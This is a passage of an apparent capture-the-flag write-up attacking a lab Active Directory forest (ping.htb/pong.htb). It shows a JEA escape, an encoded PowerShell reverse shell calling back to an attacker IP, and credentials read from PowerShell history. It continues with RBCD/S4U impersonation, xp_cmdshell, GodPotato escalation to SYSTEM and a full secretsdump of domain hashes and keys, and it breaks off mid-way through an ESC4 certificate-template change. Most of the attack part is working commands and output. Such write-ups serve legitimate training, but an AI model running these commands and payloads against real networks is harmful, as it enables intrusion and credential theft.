[*] Connecting to 'dc1.ping.htb:5985' as 'pong_gmsa$@PONG.HTB' using config 'restricted'
[%] JEA mode: Commands run as cmdlet pipelines. Run 'Get-Command' to see allowed cmdlets.
evil-winrm-py PS (JEA)>
```

After researching there error, i realise its becuase its setup with just enough administration (JEA)

```python
evil-winrm-py PS C:\ProgramData\JEA> type JEA.pssc
@{

# Version number of the schema used for this document
SchemaVersion = '2.0.0.0'

# ID used to uniquely identify this document
GUID = 'e26939b6-819a-496e-be9a-dfb45427c765'

# ConfigurationName = 'restricted'

# Author of this document
Author = 'Administrator'

# Session type defaults to apply for this session configuration. Can be 'RestrictedRemoteServer' (recommended), 'Empty', or 'Default'
SessionType = 'RestrictedRemoteServer'
LanguageMode = 'ConstrainedLanguage'
}
evil-winrm-py PS C:\ProgramData\JEA>
```

I can use my other session as `c.roberts` to see the `.pssc` file which holds the config for JEA

Whats interesting about this, is that the session type is set to a value that would set the session to NoLanguage mode, but this gets immediately overwritten afterwards with the constrained language mode

# JEA bypass

https://github.com/gatariee/minrm

Ill use this client as this is built for JEA installs

```python
❯❯❯ faketime -f +8h minrm -i DC1.ping.htb -k --krb-ccache pong_gmsa.ccache --krb-conf /etc/krb5.conf -c restricted
[kerberos@dc1.ping.htb] PS> 
```

Making sure the pong_gmsa ticket is exported i can get a session

```python
[kerberos@dc1.ping.htb] PS> $ExecutionContext.SessionState.LanguageMode
Output:
ConstrainedLanguage

[kerberos@dc1.ping.htb] PS> 
```

And as seen here i can see its constrained language mode

```python
[kerberos@dc1.ping.htb] PS> &{ whoami }
Output:
pong\pong_gmsa$

[kerberos@dc1.ping.htb] PS> 
```

And after trying a bunch of different things found in my research i get RCE

```python
[kerberos@dc1.ping.htb] PS> &{ powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAxACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== }
```

Ill grab a reverse shell from revshells and on my listener

```python
❯❯ rlwrap nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.245.56] 52945

PS C:\Users\Pong_gMSA$\Documents> 
PS C:\Users\Pong_gMSA$\Documents> whoami
pong\pong_gmsa$
PS C:\Users\Pong_gMSA$\Documents> 
```

I now have a full shell

# Compromising `c.carlssen`

```python
PS C:\Users\Pong_gMSA$\Appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt

...[SNIP]...

$c = New-object System.management.automation.pscredential("pong\c.carlssen,$(convertto-securestring -asplaintext -force "A()DUJ!@414"))
```

I have more credentials

```python
❯❯❯ faketime -f +8h nxc smb dc2.pong.htb -u 'c.carlssen' -p 'A()DUJ!@414' -k                                                                                    
SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc2.pong.htb    445    dc2              [+] pong.htb\c.carlssen:A()DUJ!@414
```

This user is now compromised

```python
❯❯❯ faketime -f +8h nxc smb dc2.pong.htb -u 'c.carlssen' -p 'A()DUJ!@414' -k --generate-tgt c.carlssen 
SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc2.pong.htb    445    dc2              [+] pong.htb\c.carlssen:A()DUJ!@414 
SMB         dc2.pong.htb    445    dc2              [+] TGT saved to: c.carlssen.ccache
SMB         dc2.pong.htb    445    dc2              [+] Run the following command to use the TGT: export KRB5CCNAME=c.carlssen.ccache
```

Ill also grab a TGT for this user

```python
❯❯❯ faketime -f +8h python3 venv/bin/evil-winrm-py -k -i dc2.pong.htb --no-pass
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.7.0

[*] Connecting to 'dc2.pong.htb:5985' as 'c.carlssen@PONG.HTB'
evil-winrm-py PS C:\Users\C.Carlssen\Documents>
```

Using this TGT i can get access over WINRM

# SYSTEM on `dc2`

![](Pasted%20image%2020261124195617.png)

I have GenericWrite on these three service accounts, and checking writable objects with bloodyAD i can see i can also configure RBCD by writing to the `msDS-AllowedToActOnBehalfOfOtherIdentity`

Ill target the sql service account and setup RBCD

```python
❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d pong.htb -k add rbcd 'svc_sql' 'pong_gmsa$' 
[!] No security descriptor has been returned, a new one will be created
[+] pong_gmsa$ can now impersonate users on svc_sql via S4U2Proxy
[+] e.g. badS4U2proxy 'kerberos+ccache://pong.htb\None:c.carlssen.ccache@dc2.pong.htb/?serverip=192.168.2.2&dc=192.168.2.2' 'HOST/svc_sql@pong.htb' 'Administrator@pong.htb'
```

Ill configure RBCD on the sql service account

```python
❯❯❯ export KRB5CCNAME=pong_gmsa.ccache 

❯❯❯ faketime -f +8h getST.py pong.htb/Pong_gMSA$ -impersonate p.reiner -spn mssqlsvc/dc2.pong.htb -k -no-pass
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating p.reiner
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in p.reiner@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache
```

Then after making sure to export the pong gmsa account TGT i can request a ticket for the `p.reiner` user, this user is in the database admins group

```python
evil-winrm-py PS C:\Users\C.Carlssen\Desktop> net user p.reiner
User name                    P.Reiner
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/16/2026 6:20:41 AM
Password expires             Never
Password changeable          1/17/2026 6:20:41 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *Database Admins      
The command completed successfully.

evil-winrm-py PS C:\Users\C.Carlssen\Desktop>
```

As shows here the user is in the database admins group, making him a good target, since he will be able to execute commands using `xp_cmdshell` as the `sql_svc` account

```python
❯❯❯ export KRB5CCNAME=p.reiner@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache

❯❯❯ faketime -f +8h mssqlclient.py pong.htb/p.reiner@dc2.pong.htb -k -no-pass -windows-auth
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC2): Line 1: Changed database context to 'master'.
[*] INFO(DC2): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (pong\P.Reiner  dbo@master)> 
```

Then after exporting this ticket i can log in to the impacket client as this user!

```python
SQL (pong\P.Reiner  dbo@master)> enable_xp_cmdshell
INFO(DC2): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC2): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (pong\P.Reiner  dbo@master)> 

SQL (pong\P.Reiner  dbo@master)> xp_cmdshell whoami
output         
------------   
pong\svc_sql   
NULL           
SQL (pong\P.Reiner  dbo@master)> 
```

Ill start by enabling `xp_cmdshell` then testing the RCE

```python
SQL (pong\P.Reiner  dbo@master)> xp_cmdshell whoami /priv
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeMachineAccountPrivilege     Add workstations to domain                Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
NULL                                                                               
SQL (pong\P.Reiner  dbo@master)> 
```

And just as i thought this user has `SeImpersonate`

Ill get a copy of godpotato from github

https://github.com/BeichenDream/GodPotato/releases

```python
evil-winrm-py PS C:\ProgramData> upload GodPotato-NET4.exe .
Uploading /home/kali/htb/pingpong/GodPotato-NET4.exe: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 56.0k/56.0k [00:00<00:00, 62.7kB/s]
[+] File uploaded successfully as: C:\ProgramData\GodPotato-NET4.exe
evil-winrm-py PS C:\ProgramData>
```

Ill use my winrm session as `c.carlssen` to upload it to the target

```python
evil-winrm-py PS C:\ProgramData> icacls ".\GodPotato-NET4.exe" /grant Everyone:F
processed file: .\GodPotato-NET4.exe
Successfully processed 1 files; Failed processing 0 files
evil-winrm-py PS C:\ProgramData>
```

Ill then grant all users full control over this file

```python
SQL (pong\P.Reiner  dbo@master)> xp_cmdshell C:\ProgramData\GodPotato-NET4.exe -cmd whoami
output                                                                             
--------------------------------------------------------------------------------   
[*] CombaseModule: 0x140728540921856                                               
[*] DispatchTable: 0x140728543508808                                               
[*] UseProtseqFunction: 0x140728542801440                                          
[*] UseProtseqFunctionParamCount: 6                                                
[*] HookRPC                                                                        
[*] Start PipeServer                                                               
[*] CreateNamedPipe \\.\pipe\93a54776-a403-430f-9be4-c841a7dd6d4f\pipe\epmapper    
[*] Trigger RPCSS                                                                  
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046                            
[*] DCOM obj IPID: 00004002-0e78-ffff-fe6a-460357866c7c                            
[*] DCOM obj OXID: 0xbcab7f2389ddf150                                              
[*] DCOM obj OID: 0xcf701e3b02e5800b                                               
[*] DCOM obj Flags: 0x281                                                          
[*] DCOM obj PublicRefs: 0x0                                                       
[*] Marshal Object bytes len: 100                                                  
[*] UnMarshal Object                                                               
[*] Pipe Connected!                                                                
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE                                      
[*] CurrentsImpersonationLevel: Impersonation                                      
[*] Start Search System Token                                                      
[*] PID : 888 Token:0x752  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation   
[*] Find System Token : True                                                       
[*] UnmarshalObject: 0x80070776                                                    
[*] CurrentUser: NT AUTHORITY\SYSTEM                                               
[*] process start with pid 3752                                                    
nt authority\system                                                                
NULL                                                                               
SQL (pong\P.Reiner  dbo@master)> 
```

Then i can execute commands as SYSTEM

```python
SQL (pong\P.Reiner  dbo@master)> xp_cmdshell C:\ProgramData\GodPotato-NET4.exe -cmd "net localgroup Administrators c.carlssen /add"
output                                                                             
--------------------------------------------------------------------------------   
[*] CombaseModule: 0x140728540921856                                               
[*] DispatchTable: 0x140728543508808                                               
[*] UseProtseqFunction: 0x140728542801440                                          
[*] UseProtseqFunctionParamCount: 6                                                
[*] HookRPC                                                                        
[*] Start PipeServer                                                               
[*] CreateNamedPipe \\.\pipe\336aa63b-e3f9-4a42-82cd-2b6aebcec4d3\pipe\epmapper    
[*] Trigger RPCSS                                                                  
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046                            
[*] DCOM obj IPID: 00007c02-0e14-ffff-af2a-c0c052aa153c                            
[*] DCOM obj OXID: 0x7b6f55b2ba3f5196                                              
[*] DCOM obj OID: 0xa115499260639e43                                               
[*] DCOM obj Flags: 0x281                                                          
[*] DCOM obj PublicRefs: 0x0                                                       
[*] Marshal Object bytes len: 100                                                  
[*] UnMarshal Object                                                               
[*] Pipe Connected!                                                                
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE                                      
[*] CurrentsImpersonationLevel: Impersonation                                      
[*] Start Search System Token                                                      
[*] PID : 888 Token:0x752  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation   
[*] Find System Token : True                                                       
[*] UnmarshalObject: 0x80070776                                                    
[*] CurrentUser: NT AUTHORITY\SYSTEM                                               
[*] process start with pid 3664                                                    
The command completed successfully.                                                
NULL                                                                               
NULL                                                                               
SQL (pong\P.Reiner  dbo@master)> 
```

Ill then add `c.carlssen` to the administrators group

Then after logging out of winrm and logging back in.....

```python
❯❯❯ faketime -f +8h python3 venv/bin/evil-winrm-py -k -i dc2.pong.htb --no-pass                              
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.7.0

[*] Connecting to 'dc2.pong.htb:5985' as 'c.carlssen@PONG.HTB'
evil-winrm-py PS C:\Users\C.Carlssen\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
evil-winrm-py PS C:\Users\C.Carlssen\Documents>
```

This user is now an admin on `dc2`

```python
❯❯❯ faketime -f +8h nxc smb dc2.pong.htb --use-kcache --smb-timeout 5
SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc2.pong.htb    445    dc2              [+] PONG.HTB\c.carlssen from ccache (Pwn3d!)
```

And of course i can use this ticket to show this too!

```python
❯❯❯ faketime -f +8h secretsdump.py pong.htb/c.carlssen@dc2.pong.htb -k -no-pass    
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xdee71f7ea0e118519be7765b9db41a65
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a24454d98e39a4a6d022b5d3e64c9e71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
pong\DC2$:aes256-cts-hmac-sha1-96:486c88bea5be139e8a271864ac2ff0216d7ccb003b5eb61f2976071490515848
pong\DC2$:aes128-cts-hmac-sha1-96:debc5c93eb20fca6eb01887a5f2104a8
pong\DC2$:des-cbc-md5:19fbeffee3525b3e
pong\DC2$:plain_password_hex:64349515ca8aa48c1bda29023b423f5a8f46f50e2f28b37107f445781b64697dedd29b93a3b87e4acd6c624f9007a491512fce15fe7a59aacaea270c93c5c428464f0f730aebcc66bbadb36a93afa8cb82656e5ac1ab01d69bcccb030934f774bd0131135528f790883abfd3d00588a8600fd24cd722c0a4bc47ba43236d430caf04de2fc8410943e18a9a082df054429bf31043d6f69387bc43a855e3e550950054967cba3895bb36794c52aa78d2aa7e04e6e4c8adea63bd5b23146f055792c5bc3aa444abd35f2df404fff90989cfcc7fbc68f7f12174f77b454cbec13f206608970f5737350ff2ebf0acc8f440a8
pong\DC2$:aad3b435b51404eeaad3b435b51404ee:e12246a7e57232eec29791ba3273a5b9:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x3fc94174d83a1bc9db957259e29130a9e19ccbef
dpapi_userkey:0xaa394100f064e1d1a6e0ad4366e0ea391358ba52
[*] NL$KM 
 0000   04 44 D9 97 85 D7 4A 1F  C5 A3 4E 26 3C 19 05 D1   .D....J...N&<...
 0010   D9 A3 20 EA 3A B3 AA A2  AC B1 30 76 BE 34 25 11   .. .:.....0v.4%.
 0020   27 03 89 80 C7 2C C3 FF  36 71 63 EA 9C ED 92 C7   '....,..6qc.....
 0030   8C 3B 31 75 38 96 2B 6E  D9 DB 61 30 D9 11 B3 63   .;1u8.+n..a0...c
NL$KM:0444d99785d74a1fc5a34e263c1905d1d9a320ea3ab3aaa2acb13076be34251127038980c72cc3ff367163ea9ced92c78c3b317538962b6ed9db6130d911b363
[*] _SC_MSSQLSERVER 
PONG\svc_sql:This!IsAServi@ceA1231ccount
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b8ebfb6e9972babf9c01311748261a8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2850c6e9dfa66b220c3e013edbb23580:::
C.Carlssen:1110:aad3b435b51404eeaad3b435b51404ee:e15edce7e905644a94f0c34a0b05104e:::
M.Sun:1111:aad3b435b51404eeaad3b435b51404ee:deccbc15ace5cbf2d902f441783f1115:::
Z.Zhen:1112:aad3b435b51404eeaad3b435b51404ee:df023cb090b82c55e3e18e5fbc7f9bc3:::
A.Pearson:1113:aad3b435b51404eeaad3b435b51404ee:9a9250fa13ba7f4c25e1a5576f5b8a03:::
P.Sanchez:1114:aad3b435b51404eeaad3b435b51404ee:5261d93d06680fc00db5454eff3bcfc0:::
H.Gordon:1115:aad3b435b51404eeaad3b435b51404ee:2dc83c2f510d420be2bf3692e9cb7371:::
P.Reiner:1116:aad3b435b51404eeaad3b435b51404ee:6fa016af828999bda0e26861e00afb31:::
C.Adam:1117:aad3b435b51404eeaad3b435b51404ee:3dbc49f649cd0ed23ecd7d5071bcf00b:::
R.Rupert:1118:aad3b435b51404eeaad3b435b51404ee:8960e808108c23470cea0551d0399e8f:::
svc_sql:1119:aad3b435b51404eeaad3b435b51404ee:9e5de13bde362ad5cc68a49d26301c3b:::
svc_print:1120:aad3b435b51404eeaad3b435b51404ee:e21d90eb3c651f4bfdf6606a4c07ffd5:::
svc_ldap:1121:aad3b435b51404eeaad3b435b51404ee:f49491f9d40172069146a9c907e4d510:::
R.Martinelli:1124:aad3b435b51404eeaad3b435b51404ee:d60fc26a0569b953a5cebd1392232630:::
DC2$:1000:aad3b435b51404eeaad3b435b51404ee:e12246a7e57232eec29791ba3273a5b9:::
Pong_gMSA$:1123:aad3b435b51404eeaad3b435b51404ee:989bd748ac8dd0b71ab24edccc9fc012:::
PING$:1103:aad3b435b51404eeaad3b435b51404ee:f7c8cda1428924a652ed8a366d343c04:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:eb76ed05ee09e812ac2b1328f5b846afeafe69f9a1ba13f94f50ab3d8d524559
Administrator:aes128-cts-hmac-sha1-96:3ca116fdd0d280d751be4efee3eeea7b
Administrator:des-cbc-md5:25ab7c5498ef6df1
krbtgt:aes256-cts-hmac-sha1-96:6282e2af4ca8f5ca935f84d03b486f2e6cc2a9b5c87fb0637a4449a44a8cd5f8
krbtgt:aes128-cts-hmac-sha1-96:f1dc39ca727289c857163fb606b5aa41
krbtgt:des-cbc-md5:6702c7679d2949ef
C.Carlssen:aes256-cts-hmac-sha1-96:1fc4a69c646ad7fe6537eedf7d08e55c93143cf4dd32ec1d27fcd9d007cb78ba
C.Carlssen:aes128-cts-hmac-sha1-96:69ba981c227f43ae62ce4ce3f60389f4
C.Carlssen:des-cbc-md5:648c5e25761973c7
M.Sun:aes256-cts-hmac-sha1-96:653c8cb750f25f9d74c0477616e542d5430cf6bee994b50161cf5d52f3bedfd0
M.Sun:aes128-cts-hmac-sha1-96:8f07ec02fc56a32150d23fd0dbc353a3
M.Sun:des-cbc-md5:105ea16e20762aa2
Z.Zhen:aes256-cts-hmac-sha1-96:208f13a06970095f1edd7942478afd6d34f3b3ccddcae627fdfc00c1b22502b8
Z.Zhen:aes128-cts-hmac-sha1-96:b89193e73905053e95fb2ad3b340cfdb
Z.Zhen:des-cbc-md5:1c8a257962dccdb5
A.Pearson:aes256-cts-hmac-sha1-96:537543f5f783db4a10f4df73e87ec7df9c692df7d970e3ee4be08c76fa53d5e7
A.Pearson:aes128-cts-hmac-sha1-96:a3a9b0fa5a8dab39c2971bab470386a7
A.Pearson:des-cbc-md5:3becd6ae4a26bf89
P.Sanchez:aes256-cts-hmac-sha1-96:12fb2b9eb168304707d6ef260269445089928f2861a8f58e54fea85e9ab5309e
P.Sanchez:aes128-cts-hmac-sha1-96:b0f0baa47311cee88ca2b52b4e8ceb49
P.Sanchez:des-cbc-md5:83dc2cc7fb5dfb57
H.Gordon:aes256-cts-hmac-sha1-96:f540010f801f234d6e1373e5a628184bf658f87f8ac510ad772300d883b300a0
H.Gordon:aes128-cts-hmac-sha1-96:24977a9c20ff0ae29914f4f882d9b0db
H.Gordon:des-cbc-md5:1a7af2c83d46e9cd
P.Reiner:aes256-cts-hmac-sha1-96:558139b55509c8a6fefe5f493f7a316cd6ab23b6eb1770c4a81934f25b6b700d
P.Reiner:aes128-cts-hmac-sha1-96:3e6a72a9be1789fd6ea0b8b9b3306c19
P.Reiner:des-cbc-md5:d5bad657b55132df
C.Adam:aes256-cts-hmac-sha1-96:647d77f0b0b0ebd22689a316339a4242044556182e3fb3c2b7bc5ffc29b1b8c4
C.Adam:aes128-cts-hmac-sha1-96:e550f93fa28e7d7196d98534c1a787ea
C.Adam:des-cbc-md5:806dc84034e6dcef
R.Rupert:aes256-cts-hmac-sha1-96:c0dfecbe5140831b99750a5c68f3ea55e3474d15caa3cc684c9a5c0be8fc4eab
R.Rupert:aes128-cts-hmac-sha1-96:e034d0c375a79fa55f36bad49760fabf
R.Rupert:des-cbc-md5:9dbca10268fddc07
svc_sql:aes256-cts-hmac-sha1-96:04268c99f2fa7c1494eb690f151dbca811659fbb2f91507af68d14ea767299a4
svc_sql:aes128-cts-hmac-sha1-96:e2823bb8675e717c06220991e69ac1b6
svc_sql:des-cbc-md5:1c3bbf5145863858
svc_print:aes256-cts-hmac-sha1-96:f9bd97d0d297630c1b1e85dd2a94a827332e2328d74141a6bafa0aa00aec0544
svc_print:aes128-cts-hmac-sha1-96:9b87341cfde9d6f5832be8fc6718126f
svc_print:des-cbc-md5:765b3434f7e9312c
svc_ldap:aes256-cts-hmac-sha1-96:cfad16d6a69c32b7a78a203485f740d132fb8713d1477d81162eac62ced1bf0b
svc_ldap:aes128-cts-hmac-sha1-96:17b3dbc9341f30adf89d67285bc5cb88
svc_ldap:des-cbc-md5:5792c71945c80bd9
R.Martinelli:aes256-cts-hmac-sha1-96:61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98
R.Martinelli:aes128-cts-hmac-sha1-96:14f94b4b3deaabde802460945a2079e9
R.Martinelli:des-cbc-md5:8c437f1f578f3b3b
DC2$:aes256-cts-hmac-sha1-96:486c88bea5be139e8a271864ac2ff0216d7ccb003b5eb61f2976071490515848
DC2$:aes128-cts-hmac-sha1-96:debc5c93eb20fca6eb01887a5f2104a8
DC2$:des-cbc-md5:16abe5405d2f51ef
Pong_gMSA$:aes256-cts-hmac-sha1-96:725f29ca3b45942c57a4e8576532f0262c55edfdce59bdcd4b411f4566ea1aa6
Pong_gMSA$:aes128-cts-hmac-sha1-96:97cefa17dcaec66d9b52a97be398acf0
Pong_gMSA$:des-cbc-md5:c15b80f26dd3ce6b
PING$:aes256-cts-hmac-sha1-96:7a9b04501db17664aff5dded8957075074f8a46481852946e0eb513628d5134b
PING$:aes128-cts-hmac-sha1-96:29ac45ade41fa73cb1d511aafa34e933
PING$:des-cbc-md5:6bbc13dc107f010d
[*] Cleaning up...
```

Ill also dump all the secrets from `dc2`

# Full domain compromise

![](Pasted%20image%2020261124202928.png)

Looking through the users in the `pong.htb` domain i something interesting, he is a member of the CA managers in `ping.htb`

```python
faketime -f +8h nxc smb dc2.pong.htb -u 'r.martinelli' --aesKey '61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98' --generate-tgt r.martinelli
SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc2.pong.htb    445    dc2              [+] pong.htb\r.martinelli:61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98 
SMB         dc2.pong.htb    445    dc2              [+] TGT saved to: r.martinelli.ccache
SMB         dc2.pong.htb    445    dc2              [+] Run the following command to use the TGT: export KRB5CCNAME=r.martinelli.ccache
```

Ill use the secretdump output to get the aes key of `r.martinelli` to get a TGT

```python
❯❯❯ faketime -f +8h bloodyAD --host dc1.ping.htb -d pong.htb -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=ping,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-21-2410575906-3092493790-2123333151-1124,CN=ForeignSecurityPrincipals,DC=ping,DC=htb
permission: WRITE

distinguishedName: CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
permission: WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: DC=ping.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=ping,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.ping.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=ping,DC=htb
permission: CREATE_CHILD
```

Now using that TGT in bloodyAD i can see the same thing

The output suggests this is vulnerable to ESC4

```python
❯❯❯ faketime -f +8h bloodyAD --host dc1.ping.htb -d pong.htb -k set object "CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb" mspki-certificate-name-flag -v 1         
[+] CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb's msPKI-Certificate-Name-Flag has been updated

